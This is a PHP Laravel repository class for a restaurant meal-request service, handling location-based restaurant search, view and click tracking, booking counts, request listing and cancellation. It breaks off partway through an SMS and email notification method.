<?php
/**
 * Created by PhpStorm.
 * Restaurant: tOm_HydRa
 * Date: 9/10/16
 * Time: 12:06 PM
 */

namespace App\Repositories;

use App\Entities\MenuGroup;
use App\Entities\MenuList;
use App\Entities\MenuSubGroup;
use App\Entities\MenuType;
use App\Entities\MenuVisualOrder;
use App\Entities\Restaurant;
use App\Entities\RestaurantOpen;
use App\Entities\RestaurantType;
use App\Entities\RestaurantClick;
use App\Entities\RestaurantView;
use App\Entities\SyncServOwn;
use App\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Lang;
use Illuminate\Support\Facades\Mail;
use League\Geotools\Coordinate\Coordinate;
use League\Geotools\Geotools;
use Webpatser\Uuid\Uuid;

use App\Entities\Client;
use App\Entities\ClientGroup;
use App\Entities\Ingredient;
use App\Entities\MealRequest;
use App\Entities\RequestMenu;
use App\Entities\Order;
use App\Entities\OrderDetail;
use App\Entities\RequestIngredient;
use App\Entities\RequestParam;
use App\Entities\RestaurantOrderNumber;
use App\Entities\Setting;

class RestaurantRepository
{
    protected $MAX_DISTANCE = 10;
    public $days = array(
        "-1"=> "Scheduled",
        "0" =>"Cooked Every day",
        "1"=> "monday",
        "2"=> "tuesday",
        "3"=> "wednesday",
        "4"=> "thursday",
        "5"=> "friday",
        "6"=> "saturday",
        "7"=> "sunday"
    );

    public $MENU_TYPE_LEVEL = 0;
    public $MENU_GROUP_LEVEL = 1;
    public $MENU_SUB_GROUP_LEVEL = 2;
    public $MENU_LIST_LEVEL = 3;
    private $toggle = false;
    public $DEFAULT_LEVEL = 1000;

    public function store($request, $user_id){
        if ($request->has("restaurant")){
            $this->save($request->restaurant, $user_id);
        }
    }


    public function find($restaurant_id){
        $restaurant = Restaurant::find($restaurant_id);
        return $restaurant;
    }

    public function all(Request $request, $n){
        if ($request->currentPosition){
            $currentPosition = $request->currentPosition;
            if ($request->has("distance"))
                $this->MAX_DISTANCE = $request->distance;

            $restaurants = Restaurant::searchRestaurant($request)
                ->filterByStatus($request)
                ->filterByGarden($request)
                ->filterByDelivery($request)
                ->filterByIsDayMenu($request)
                ->filterByRestaurantType($request)
                ->filterByKitchenType($request)
                ->get();

            $filtered = $restaurants->filter(function($item) use ($currentPosition, $request){
                $time_bool = true;
                if ($request->filter_by_date){
                    $time_bool = false;
                    $time = $request->time;
                    $day = $request->date;
                    if($time && ($day || $day === 0 || $day === "0")){
                        $day = (int)$day;
                        $openingHours = $item->openingHours;
                        $time_bool = $this->isRestaurantOpen($openingHours, $day, $time);
                        if ($time_bool && ($request->delivery || $request->cuisineType || $request->isDayMenu)){
                            $time_bool = false;
                            $menu_lists = $item->menu_lists;
                            foreach ($menu_lists as $menu_list) {
                                if ($menu_list->isActive == 1){
                                    if ($menu_list->is_day_menu == $day || ($menu_list->is_day_menu == 0 && !$request->isDayMenu)){
                                        if (strtotime($menu_list->time_from) <= strtotime($time) &&
                                            strtotime($menu_list->time_to) >= strtotime($time)){
                                            $time_bool = true;
                                        }
                                    }

                                    else if ($menu_list->menu_schedule){
                                        $time_bool = $this->isMenuScheduleValid($menu_list->menu_schedule, $day, $time);

                                    }

                                    if ($time_bool && $request->has("dateObject")){
                                        $current_time = new Carbon();
                                        $serve_at = new Carbon($request->dateObject);
                                        $time_carbon = new Carbon($request->time);
                                        $serve_at->setTime($time_carbon->hour, $time_carbon->minute);
                                        $init_time = new Carbon("0001-01-01 00:00:00");
                                        $book_to = new Carbon($menu_list->book_to);
                                        $book_from = $menu_list->book_from;
                                        $current_time_serve_at_difference = $this->getDiffInTime($serve_at, $current_time);
                                        $init_time_book_to_difference = $this->getDiffInTime($book_to, $init_time);
                                        $current_time_serve_at_days_difference = $current_time_serve_at_difference / (3600 * 24);

                                        if ($current_time_serve_at_difference < 0 ||
                                            $current_time_serve_at_difference < $init_time_book_to_difference ||
                                            $current_time_serve_at_days_difference > $book_from)
                                        {
                                            $time_bool = false;
                                        }
                                    }

                                    if ($time_bool && $request->delivery){
                                        $time_bool = false;
                                        if ($menu_list->delivered == 1){
                                            $time_bool = true;
                                        }
                                    }

                                    if ($time_bool && $request->cuisineType){
                                        $time_bool = false;
                                        if ($menu_list->kitchenType && $menu_list->kitchenType->name == $request->cuisineType){
                                            $time_bool = true;
                                        }
                                    }

                                    if ($time_bool) break;
                                }

                            }
                        }

                    }
                }

                if ($time_bool){
                    $distance = $this->distance($currentPosition["latitude"], $currentPosition["longitude"], $item->latitude, $item->longitude);
                    $item->distance = $distance;
                    return $distance < $this->MAX_DISTANCE;
                }

            });

            $filtered = $filtered->sortBy('distance');
            $lang = $filtered->first()->lang;
            $limit_distance = Setting::where('lang', '=', $lang)->first()->fp_radius;

            foreach ($filtered as $key => $val) {
                if ($val->first_pos > 0 && ($val->distance*1000)<$limit_distance){
                    unset($filtered[$key]);
                    break;
                }
            }

            $currentPage = LengthAwarePaginator::resolveCurrentPage();
            $pagedData = $filtered->slice(($currentPage - 1) * $n, $n)->all();
            $data = new LengthAwarePaginator($pagedData, count($filtered), $n);
            return $data;
            // return (object)array('bestmatch' => $bestmatch, 'searched_data' => $data);
        }
        return Restaurant::searchRestaurant($request)->paginate($n);
    }

    public function getRecommended(Request $request, $n){
        if ($request->currentPosition){
            $currentPosition = $request->currentPosition;
            if ($request->has("distance"))
                $this->MAX_DISTANCE = $request->distance;

            $restaurants = Restaurant::searchRestaurant($request)
                ->filterByStatus($request)
                ->filterByGarden($request)
                ->filterByDelivery($request)
                ->filterByIsDayMenu($request)
                ->filterByRestaurantType($request)
                ->filterByKitchenType($request)
                ->get();

            $filtered = $restaurants->filter(function($item) use ($currentPosition, $request){
                $time_bool = true;
                if ($request->filter_by_date){
                    $time_bool = false;
                    $time = $request->time;
                    $day = $request->date;
                    if($time && ($day || $day === 0 || $day === "0")){
                        $day = (int)$day;
                        $openingHours = $item->openingHours;
                        $time_bool = $this->isRestaurantOpen($openingHours, $day, $time);
                        if ($time_bool && ($request->delivery || $request->cuisineType || $request->isDayMenu)){
                            $time_bool = false;
                            $menu_lists = $item->menu_lists;
                            foreach ($menu_lists as $menu_list) {
                                if ($menu_list->isActive == 1){
                                    if ($menu_list->is_day_menu == $day || ($menu_list->is_day_menu == 0 && !$request->isDayMenu)){
                                        if (strtotime($menu_list->time_from) <= strtotime($time) &&
                                            strtotime($menu_list->time_to) >= strtotime($time)){
                                            $time_bool = true;
                                        }
                                    }

                                    else if ($menu_list->menu_schedule){
                                        $time_bool = $this->isMenuScheduleValid($menu_list->menu_schedule, $day, $time);

                                    }

                                    if ($time_bool && $request->has("dateObject")){
                                        $current_time = new Carbon();
                                        $serve_at = new Carbon($request->dateObject);
                                        $time_carbon = new Carbon($request->time);
                                        $serve_at->setTime($time_carbon->hour, $time_carbon->minute);
                                        $init_time = new Carbon("0001-01-01 00:00:00");
                                        $book_to = new Carbon($menu_list->book_to);
                                        $book_from = $menu_list->book_from;
                                        $current_time_serve_at_difference = $this->getDiffInTime($serve_at, $current_time);
                                        $init_time_book_to_difference = $this->getDiffInTime($book_to, $init_time);
                                        $current_time_serve_at_days_difference = $current_time_serve_at_difference / (3600 * 24);

                                        if ($current_time_serve_at_difference < 0 ||
                                            $current_time_serve_at_difference < $init_time_book_to_difference ||
                                            $current_time_serve_at_days_difference > $book_from)
                                        {
                                            $time_bool = false;
                                        }
                                    }

                                    if ($time_bool && $request->delivery){
                                        $time_bool = false;
                                        if ($menu_list->delivered == 1){
                                            $time_bool = true;
                                        }
                                    }

                                    if ($time_bool && $request->cuisineType){
                                        $time_bool = false;
                                        if ($menu_list->kitchenType && $menu_list->kitchenType->name == $request->cuisineType){
                                            $time_bool = true;
                                        }
                                    }

                                    if ($time_bool) break;
                                }

                            }
                        }

                    }
                }

                if ($time_bool){
                    $distance = $this->distance($currentPosition["latitude"], $currentPosition["longitude"], $item->latitude, $item->longitude);
                    $item->distance = $distance;
                    return $distance < $this->MAX_DISTANCE;
                }

            });
            $filtered = $filtered->sortBy('distance');   

            $lang = $filtered->first()->lang;
            $limit_distance = Setting::where('lang', '=', $lang)->first()->fp_radius;
            $i=-1;
            $bestmatch = Restaurant::where('id',-1)->get();
            $bestmatchid = -1; 
            foreach ($filtered as $del => $content) {
                $i++;
                if ($content->first_pos > 0 && ($content->distance*1000)<$limit_distance){
                    $bestmatchid = $content->id;
                    $bestmatch = $filtered->slice($i, 1);
                    unset($filtered[$del]);
                    break;
                }
            }       
            $from = ($request->page-1)*5;
            $filtered_view = $filtered->slice($from, $n);
            $filtered_view = $filtered_view->merge($bestmatch);

            $ip = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);
            
            foreach ($filtered_view as $key => $val) {
                $result = RestaurantView::where([["IP", $ip], ["ID_restaurant", $val->id]])->orderBy('view_time','desc')->get();
                $beforematches = RestaurantView::where('disp_type','B')->orwhere('disp_type','F')->orderBy('view_time','desc')->get()->take(1);
                if (count($result) > 0){
                    $current_data = date("Y-m-d H:i:s"); 
                    if(substr($current_data,9,1)>substr($result[0]->view_time,9,1)){   //if this IP client visit one day after
                        $restaurantView  = new RestaurantView();
                        $restaurantView->ID_restaurant = $val->id;
                        $restaurantView->IP = $ip;         
                        $restaurantView->disp_type = 'N';
                        if ($val->id == $bestmatchid) $restaurantView->disp_type = 'F';
                        if($val->highlight > 0){
                            $restaurantView->disp_type = 'H';
                            if ($val->id == $bestmatchid) $restaurantView->disp_type = 'B';
                        }
                        $restaurantView->save();
                        
                        $restaurant = Restaurant::find($val->id);        
                        if($restaurant->highlight > 0) --$restaurant->highlight;
                        if($val->id == $bestmatchid) --$restaurant->first_pos;
                        $restaurant->save();
                    } 
                    else if(substr($current_data,9,1)==substr($result[0]->view_time,9,1)){  
                        if(count($beforematches)>0 && $beforematches[0]->ID_restaurant!=$bestmatchid){
                            $restaurantView  = RestaurantView::where([["IP", $ip], ["ID_restaurant", $bestmatchid]])->orderBy('view_time','desc')->first(); 
                            if(count($restaurantView)>0){                            
                                $restaurantView->disp_type = 'F';
                                if($val->highlight > 0)  $restaurantView->disp_type = 'B';                            
                                $restaurantView->save();

                                $restaurant = Restaurant::find($bestmatchid);   
                                --$restaurant->first_pos;
                                $restaurant->save();
                                break;
                            }
                        }
                    }
                }
                else{
                    $restaurantView  = new RestaurantView();
                    $restaurantView->ID_restaurant = $val->id;
                    $restaurantView->IP = $ip;                    
                    $restaurantView->disp_type = 'N';
                    if ($val->id == $bestmatchid) $restaurantView->disp_type = 'F';
                    if($val->highlight > 0){
                        $restaurantView->disp_type = 'H';
                        if ($val->id == $bestmatchid) $restaurantView->disp_type = 'B';
                    }
                    $restaurantView->save();

                    $restaurant = Restaurant::find($val->id);        
                    if($restaurant->highlight > 0) --$restaurant->highlight;
                    if($val->id == $bestmatchid) --$restaurant->first_pos;
                    $restaurant->save();
                }
            }
            return $bestmatch;
        }        
    }

    public function detailClicked($restaurant_id, $type){
        $ip = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);
        $restaurantClick  = new RestaurantClick();
        $restaurantClick->ID_restaurant = $restaurant_id;
        $restaurantClick->view_time = date("Y-m-d H:i:s"); 
        $restaurantClick->IP = $ip;
        $restaurantClick->click_at = $type;
        $restaurantClick->save();
    }

    public function getRestaurantList(){
        return Restaurant::groupby('name')->get(['id', 'ID_user', 'name', 'lang', 'street', 'city', 'address_note', 'request_hours']);
    }

    public function getRestaurantAddress($restaurantId){
        return Restaurant::find($restaurantId);
    }

    public function restaurantCountUnreadRequest($restaurantId){
        $restaurant = Restaurant::find($restaurantId);
        $lang = $restaurant->lang;

        $countNewRequests = MealRequest::where([ ['unread', '=', 'R'], ['status', '=', 'N'], ['ID_restaurant', '=', $restaurantId] ] )->get()->count();

        $countConfirmRequests = MealRequest::where([ ['unread', '=', 'R'], ['status', '=', 'A'], ['ID_restaurant', '=', $restaurantId] ] )->get()->count();

        $countCancelRequests = MealRequest::where([ ['unread', '=', 'R'], ['status', '=', 'C'], ['ID_restaurant', '=', $restaurantId] ] )->get()->count();

        $requestServingDelta = Setting::where('lang', '=', $lang)->first();
        if (isset($requestServingDelta->request_serving_delta)) {
            $maxServing = $requestServingDelta->request_serving_delta;
        }
        else{
            $maxServing = '';
        }

        $count = array('new_unread' => $countNewRequests,'confirm_unread' => $countConfirmRequests,'cancel_unread' =>$countCancelRequests, 'request_serving_delta' => $maxServing);
        
        return $count;
    }

     public function countMissingBooking($restaurantId){

        DB::enableQueryLog();

        $client = app('Dingo\Api\Auth\Auth')->user()->client;
        $all_order_details = [];

        $orders = Order::with(['request','request_order_detail', 'request_order_detail.requestMenu', 'request_order_detail.requestParam'])
        ->where([['ID_restaurant',$restaurantId]])->get();

        foreach ($orders as $okey => $order) {
            if(isset($order->request) && ($order->request->status == 'S' || $order->request->status == 'A'))
            {
                $order_details_ids = [];

                foreach ($order->request_order_detail as $key => $orders_detail) {
                    if( in_array($orders_detail->status, array(1,2)) ){

                        $order_details_ids[] = $orders_detail->ID;

                        $orders_detail_from = ($orders_detail->requestParam->request_from == '00:00:00' || $orders_detail->requestParam->request_from == '') ? date('H:i:s', strtotime($orders_detail->serve_at) ) : date('H:i:s', strtotime($orders_detail->requestParam->request_from) );

                        $orders_detail_to = ($orders_detail->requestParam->request_to == '00:00:00' || $orders_detail->requestParam->request_to == '') ? date('H:i:s', strtotime($orders_detail->serve_at.'+1 hour') ) : date('H:i:s', strtotime($orders_detail->requestParam->request_to) );

                        $request_params = RequestParam::with(["order_detail","order_detail.order","order_detail.requestMenu"])
                        ->whereBetween('request_from', array($orders_detail_from, $orders_detail_to))
                        ->orWhereBetween('request_to', array($orders_detail_from, $orders_detail_to))
                        ->orWhere([["request_from",">=",$orders_detail_from],["request_to","<=",$orders_detail_to]])
                        ->orWhere("request_from","=","00:00:00")
                        ->orWhere("request_to","=","00:00:00")
                        ->whereHas('order_detail.requestMenu', function ($query) use($orders_detail){
                            if(!empty($orders_detail->requestMenu->confirmed_name))
                            $query->where('name', '=', $orders_detail->requestMenu->confirmed_name)->orWhere('confirmed_name', '=', $orders_detail->requestMenu->confirmed_name);
                            else
                            $query->where('name', '=', $orders_detail->requestMenu->name)->orWhere('confirmed_name', '=', $orders_detail->requestMenu->name);
                        })
                        ->whereHas('order_detail.order', function ($query) use($order){
                            $query->where('ID_restaurant', '=', $order->ID_restaurant);
                        })->get();


                        $count = 0; 
                        $detail_serve_at = date('Y-m-d', strtotime( $orders_detail->serve_at ) );
                        foreach ($request_params as $key => $request_param) {
                            $request_param_serve_at = date('Y-m-d', strtotime( $request_param->order_detail->serve_at ) );
                            if(isset($request_param->order_detail)
                              && in_array( $request_param->order_detail->status, array(1,2) ) 
                              && isset($request_param->order_detail->order)
                              && isset($request_param->order_detail->requestMenu) 
                              && isset($request_param->order_detail->order->ID_restaurant) 
                              && ($request_param->order_detail->order->ID_restaurant==$order->ID_restaurant) 
                              && ($detail_serve_at == $request_param_serve_at)
                              && 
                                ( 
                                    (
                                        empty(trim($request_param->order_detail->requestMenu->confirmed_name)) 
                                        || 
                                        ( trim($request_param->order_detail->requestMenu->confirmed_name) == 
                                            (   empty($orders_detail->requestMenu->confirmed_name)?trim($orders_detail->requestMenu->name):trim($orders_detail->requestMenu->confirmed_name)
                                            )
                                        )
                                    ) 
                                    && 
                                    ( 
                                        !empty(trim($request_param->order_detail->requestMenu->confirmed_name)) 
                                        || 
                                        ( 
                                            trim($request_param->order_detail->requestMenu->name) == (empty(trim($orders_detail->requestMenu->confirmed_name))?trim($orders_detail->requestMenu->name):trim($orders_detail->requestMenu->confirmed_name))
                                        )
                                    )
                                )
                            ){

                                $serve_at = date('Hi', strtotime($orders_detail->serve_at) );
                                $next_serve_at = date('Hi', strtotime($orders_detail->serve_at.'+1 hour') );
                              

                                $from_serve_at = ($request_param->request_from == '00:00:00' || $request_param->request_from == '') ? date('Hi', strtotime($request_param->order_detail->serve_at) ) : date('Hi', strtotime($request_param->request_from) );

                                $to_serve_at = ($request_param->request_to == '00:00:00' || $request_param->request_to == '') ? date('Hi', strtotime($request_param->order_detail->serve_at.'+1 hour') ) : date('Hi', strtotime($request_param->request_to) );


                                if ( trim($orders_detail->requestParam->request_from) == '00:00:00' 
                                        || trim($orders_detail->requestParam->request_from) == ''
                                        || trim($orders_detail->requestParam->request_to) == '00:00:00'
                                        || trim($orders_detail->requestParam->request_to) == ''
                                    ) {
                                    if( ( $from_serve_at >= $serve_at && $from_serve_at <= $next_serve_at )
                                        || 
                                        ( $to_serve_at >= $serve_at && $to_serve_at <= $next_serve_at ) 
                                        || 
                                        ( $from_serve_at <= $serve_at && $to_serve_at >= $serve_at )
                                        || 
                                        ( $from_serve_at <= $next_serve_at && $to_serve_at >= $next_serve_at ) 
                                        || 
                                        ( $from_serve_at <= $serve_at && $from_serve_at >= $serve_at )
                                        || 
                                        ( $to_serve_at  <= $next_serve_at && $to_serve_at >= $next_serve_at ) 
                                        || 
                                        ( $to_serve_at  <= $serve_at && $to_serve_at >= $serve_at )
                                        || 
                                        ($request_param->order_detail->ID ==  $orders_detail->ID) 
                                        ) {

                                        $x_number = $request_param->order_detail->x_number;
                                        $count = $count + $x_number;
                                    }
                                    else{
                                        $count = $count;
                                    }
                                }
                                else{
                                    $x_number = $request_param->order_detail->x_number;
                                    $count = $count + $x_number;
                                }
                            }
                        }
                        $all_order_details[$orders_detail->ID] = $count;
                    }
                }
            }
        }
        return $all_order_details;
    }


    public function currentRequests($restaurantId, $serveAt){

        if ($serveAt) {
            $serve_at_date = date('Y-m-d', strtotime( $serveAt ));
            $serve_at_time = date('Hi', strtotime( $serveAt ));
        }
        else{
            $serve_at_date = date('Y-m-d');
            $serve_at_time = date('Hi');
        }

        $getMealRequests = MealRequest::with(['orders','orders.request_orders_detail.requestParam','orders.request_order_detail','orders.request_order_detail.requestParam','orders.request_order_detail.requestMenu']); 

       
        $getMealRequests = $getMealRequests->where([ ['status', '=', 'A'], ['ID_restaurant', '=', $restaurantId] ])->orWhere([ ['status', '=', 'S'], ['ID_restaurant', '=', $restaurantId] ])->orWhere([ ['status', '=', 'N'], ['ID_restaurant', '=', $restaurantId] ]);
        
        
        $getMealRequests = $getMealRequests->get();

        $statusArray = array(0, 1, 2, 4);

        $before = collect();
        $after = collect();
        if (count($getMealRequests)){
            foreach ($getMealRequests as $getMealRequest) {
                $order = $getMealRequest->orders;
                $orders_detail = $order->request_order_detail;
                $current_time = Carbon::now("Europe/Prague");
                foreach ($orders_detail as $order_detail) {
                    if ( 
                        isset($order_detail->requestParam) 
                        && isset($order_detail->requestParam->request_from) 
                        && isset($order_detail->requestParam->request_to) 
                        && $order_detail->requestParam->request_from != '00:00:00' 
                        && $order_detail->requestParam->request_to != '00:00:00' 
                        && $order_detail->requestParam->request_from != '' 
                        && $order_detail->requestParam->request_to != '' 
                    ) {
                        $serve_time = new Carbon($order_detail->requestParam->request_from);
                    }
                    else{
                        $serve_time = new Carbon($order_detail->serve_at);
                    }


                    $diffInMinutes = $this->getDiffInTimeCustom($serve_time, $current_time);
                    $order_detail->difference = $diffInMinutes;
                }

                $orders_detail = $orders_detail->sortBy("difference");
                $filtered_order_detail = $orders_detail->first();
                if ($filtered_order_detail){

                    if ( 
                        isset($filtered_order_detail->requestParam) 
                        && isset($filtered_order_detail->requestParam->request_from) 
                        && isset($filtered_order_detail->requestParam->request_to) 
                        && $filtered_order_detail->requestParam->request_from != '00:00:00' 
                        && $filtered_order_detail->requestParam->request_to != '00:00:00' 
                        && $filtered_order_detail->requestParam->request_from != '' 
                        && $filtered_order_detail->requestParam->request_to != '' 
                    ) {
                        $serve_at = new Carbon($filtered_order_detail->requestParam->request_from);
                    }
                    else{
                        $serve_at = new Carbon($filtered_order_detail->serve_at);
                    }
                    
                    $diff = $this->getDiffInTimeCustom($serve_at, $current_time);
                    $getMealRequest->diff = $diff;
                    if ($diff >= 0){
                        $before->push($getMealRequest);
                    } else {
                        $after->push($getMealRequest);
                    }
                }
            }

            $before = $before->sortBy('diff');
            $after = $after->sortByDesc('diff');
            $merged = $before->merge($after);

            $ordersDetail = collect();
            $ordersMealName = array();
            $ordersMealFrom = array();
            $ordersMealTo = array();

            foreach ($merged as $getMealRequest) {
                if ( isset($getMealRequest->orders) ) {
                    $order = $getMealRequest->orders;
                    $orders_detail = $order->request_order_detail;
                    foreach ($orders_detail as $order_detail) {
                        $servedate = date('Y-m-d', strtotime($order_detail->serve_at) );
                        $servetime = date('Hi', strtotime($order_detail->serve_at) );
                        $servetime2 = date('Hi', strtotime($order_detail->serve_at.'+1 hour') );

                        if ( isset($order_detail->requestMenu) && $order_detail->requestMenu ) {
                            if ( $order_detail->requestMenu->confirmed_name ) {
                                $requestMealName = $order_detail->requestMenu->confirmed_name;
                            }
                            else{
                                $requestMealName = $order_detail->requestMenu->name;
                            }
                        }
                        else{
                            $requestMealName = '';
                        }
                       
                        if ( 
                            $order_detail->side_dish == 0
                            && in_array($order_detail->status, $statusArray) 
                            && $servedate ==  $serve_at_date
                        ) {
                            if ( 
                                isset($order_detail->requestParam) 
                                && isset($order_detail->requestParam->request_from) 
                                && isset($order_detail->requestParam->request_to) 
                                && $order_detail->requestParam->request_from != '00:00:00' 
                                && $order_detail->requestParam->request_to != '00:00:00' 
                                && $order_detail->requestParam->request_from != '' 
                                && $order_detail->requestParam->request_to != '' 
                            ) {

                                if ( date('Hi', strtotime($order_detail->requestParam->request_to) ) >= $serve_at_time ) {
                                    
                                    $request_from = date('Hi', strtotime($order_detail->requestParam->request_from) );
                                    $request_to = date('Hi', strtotime($order_detail->requestParam->request_to) );

                                    $count = 0;
                                    foreach ($ordersMealName as $key => $orderMealName) {
                                        if ( trim($orderMealName) == trim($requestMealName) ) {
                                            if( ( $request_from >= $ordersMealFrom[$key] && $request_from <= $ordersMealTo[$key] )
                                                || ($request_to >= $ordersMealFrom[$key] && $request_to <= $ordersMealTo[$key])
                                            ){
                                                $count++;
                                            }
                                        }
                                    }

                                    if ( $count == 0 ) {
                                        $ordersDetail->push($order_detail);
                                    }
                                    $ordersMealName[] = ltrim($requestMealName);
                                    $ordersMealFrom[] = date('Hi', strtotime($order_detail->requestParam->request_from) );
                                    $ordersMealTo[] = date('Hi', strtotime($order_detail->requestParam->request_to) );
                                }
                            }
                            else if( $servetime >= $serve_at_time ){
                                $count = 0;
                                foreach ($ordersMealName as $key => $orderMealName) {
                                    if ( trim($orderMealName) == trim($requestMealName) ) {
                                        if( ( $servetime >= $ordersMealFrom[$key] && $servetime <= $ordersMealTo[$key] )
                                            || ($servetime2 >= $ordersMealFrom[$key] && $servetime2 <= $ordersMealTo[$key])
                                        ){
                                            $count++;
                                        }
                                    }
                                }

                                
                                if ( $count == 0 ) {
                                    $ordersDetail->push($order_detail);
                                }
                                $ordersMealName[] = ltrim($requestMealName);
                                $ordersMealFrom[] = $servetime;
                                $ordersMealTo[] = $servetime2;
                            }
                        }
                    }
                }
            }
            
            if (count($ordersDetail)) {
                return $ordersDetail;
            }
            return "Meal Request Not Found";
        }
        return "Meal Request Not Found";
    }

    public function restaurantRequest($restaurantId, $status){
        $client = app('Dingo\Api\Auth\Auth')->user()->client;


        $getMealRequests = MealRequest::with(['orders','orders.client_detail','orders.client_detail.user','orders.request_orders_detail','orders.request_order_detail','orders.request_order_detail.requestParam','orders.request_order_detail.requestMenu','orders.request_order_detail.requestMenu.requestIngredient','orders.request_order_detail.requestMenu.requestIngredient.ingredient','orders.request_order_detail.requestMenu.requestIngredient.duplicate_of_ingredient','orders.request_order_detail.requestMenu.requestIngredient.duplicate_of_ingredient.ingredient']); 


        if ( $status == 'N' ) {
            $getMealRequests = $getMealRequests->where([ ['status', '=', 'N'], ['ID_restaurant', '=', $restaurantId] ]);
        }
        if ( $status == 'P' ) {
            $getMealRequests = $getMealRequests->where([ ['status', '=', 'S'], ['ID_restaurant', '=', $restaurantId] ]);
        }
        else if( $status == 'C' ){
            $getMealRequests = $getMealRequests->where([ ['status', '=', 'A'], ['ID_restaurant', '=', $restaurantId] ]);
        }
        else if( $status == 'CA' ){
            $getMealRequests = $getMealRequests->where([ ['status', '=', 'E'], ['ID_restaurant', '=', $restaurantId] ])->orWhere([ ['status', '=', 'C'], ['ID_restaurant', '=', $restaurantId] ]);
        }
        $getMealRequests = $getMealRequests->get();

        $before = collect();
        $after = collect();
        if (count($getMealRequests)){
            foreach ($getMealRequests as $getMealRequest) {
                $order = $getMealRequest->orders;
                $orders_detail = $order->request_order_detail;
                $current_time = Carbon::now("Europe/Prague");
                foreach ($orders_detail as $order_detail) {
                    $serve_time = new Carbon($order_detail->serve_at);
                    $diffInMinutes = $this->getDiffInTimeCustom($serve_time, $current_time);
                    $order_detail->difference = $diffInMinutes;
                }

                $orders_detail = $orders_detail->sortBy("difference");
                $filtered_order_detail = $orders_detail->first();
                if ($filtered_order_detail){
                    $serve_at = new Carbon($filtered_order_detail->serve_at);
                    $diff = $this->getDiffInTimeCustom($serve_at, $current_time);
                    $getMealRequest->diff = $diff;
                    if ($diff >= 0){
                        $before->push($getMealRequest);
                    } else {
                        $after->push($getMealRequest);
                    }
                }
            }

            $before = $before->sortBy('diff');

            $after = $after->sortByDesc('diff');
            $merged = $before->merge($after);

            $currentPage = LengthAwarePaginator::resolveCurrentPage();

            $pagedData = $merged->slice(($currentPage - 1) * 5, 5)->all();

            return new LengthAwarePaginator($pagedData, count($merged), 5);

        }
        return "Meal Request Not Found";
    }

    public function changeStatus($request_id){
        if ($request_id) {
            $checkStatus = MealRequest::find($request_id);
            if ($checkStatus->unread == 'R' ) {
                $requests = MealRequest::find($request_id);
                $requests->unread = 'N';
                $requests->timestamps = false;
                $requests->save();
            }
            return ['message' => "success"];
        }
        else{
            return ['message' => "Error"];
        }
    }

    public function cancelRestaurantRequest($request){
        $requests = new MealRequest();
        if ($request->ID) {


            $statusArr = array(0, 1, 2);
            $requestStatus = MealRequest::where('ID', '=', $request->ID)->first();
            if ( $requestStatus->ID_orders ) {
                $orderStatus = Order::where('ID', '=', $requestStatus->ID_orders)->first();
                if ( !in_array($orderStatus->status, $statusArr) ) {
                    if ( $orderStatus->status == 1 ) {
                        $openTab = "pendingRequests";
                    }
                    else if ( $orderStatus->status == 2 ) {
                        $openTab = "confirmedRequests";
                    }
                    else if ( $orderStatus->status == 3 ) {
                        $openTab = "cancelledRequests";
                    }
                    else{
                        $openTab = "newRequests";
                    }
                    return ['message' => "success", 'openTab' => $openTab];
                }
            }



            $requests = MealRequest::find($request->ID);
            $requests->status = 'E';
            $requests->unread = 'C';
            $requests->timestamps = false;
            $comment = (($request->comment))? $request->comment : '';
            if ($requests->save()) {
                $checkorderComment = Order::find($requests->ID_orders);
                if ( $checkorderComment->comment && $request->comment) {
                    $preComment = explode('<br>', $checkorderComment->comment);
                    $comment = $preComment[0].' <br> '.$request->comment;
                }
                else if($checkorderComment->comment){
                    $preComment = explode('<br>', $checkorderComment->comment);
                    $comment = $preComment[0].' <br> ';
                }
                else{
                    $comment = '';
                }

                $checkCommentEmpty = str_replace(' ', '', $comment);
                if ( $checkCommentEmpty == '<br>' ) {
                    $comment = '';
                }

                Order::where('ID', $requests->ID_orders)->update(['status' => 3, 'comment' => $comment]);
                $order = Order::find($requests->ID_orders);
                $client = Client::find($order->ID_client);
                $clientLang = $client->lang;
                if ($requests->ID_restaurant) {
                    $restaurantID = $requests->ID_restaurant;
                    $restaurant = Restaurant::find($restaurantID);
                    $new_restaurant = '';
                }
                else{
                    $restaurant = '';
                    $new_restaurant = array();
                    $new_restaurant['name'] = (($requests->new_restaurant)) ? $requests->new_restaurant : '';
                    $new_restaurant['address'] = (($requests->new_address)) ? $requests->new_address : '';
                }

                $user = User::find($client->ID_user);

                $getMealRequest = MealRequest::with(['orders','orders.request_order_detail','orders.request_order_detail.requestMenu'])->whereHas('orders', function ($query) use($requests){
                    $query->where('ID', '=', $requests->ID_orders);
                })->orderBy('ID', 'DESC')->first();

                $lang = $request->input('lang', 'CZE');

                $sent = $this->sendCancelEmailReminder('cancel', $user, $getMealRequest, $restaurant, $lang, 'user', $new_restaurant, $clientLang);

                return ['message' => "success"];
            }
            else{
                return ['message' => "Error"];
            }
        }
        else{
            return ['message' => "Error"];
        }
    }


   public function sendSMSEmailReminder($type, User $user, $getMealRequest, $restaurant, $clientLang, $to, $new_restaurant)
    {
        /*$lang = $lang == "cs" ? "cz" : $lang;
        $path = 'emails.order.order_'.$type. '_'.$lang;*/

         if ( !empty($clientLang) ) {
            $langSett = $clientLang;
        }
        else{
            $langSett = 'CZE';
        }
        $setting = Setting::where('lang', '=', $langSett)->first();
        $lang = Setting::where('lang', '=', $clientLang)->first()->dhort_name;
        $currency = $setting->currency_short;
        app()->setLocale($lang);

        $path = 'emails.requestMeal.request_'.$type;

        try {
            
            $phone_number = $restaurant->SMS_phone;
            
            if(!empty($phone_number) && $phone_number != null){
                
                $phone_number = str_replace(array(' ',':',';','-','/'), array('',',',',', '',''), $phone_number);
                $phone_numbers = explode(",", $phone_number);
               
                if(count($phone_numbers)){
                    
                    $setting =  Setting::where(["lang" => $restaurant->lang])->first();
                    
                    foreach($phone_numbers as $phone_number){
                        
                        if(strpos($phone_number,"+") === false 
                            && (strpos($phone_number,"00") === false || strpos($phone_number,"00"))){
                            $phone_number = "+".($setting->phone_code).$phone_number;
                        }
                        
                        if(strpos($phone_number,"+".$setting->phone_code) === 0 || strpos($phone_number,"00".$setting->phone_code) === 0)
                        {
               
                        Mail::send($path,
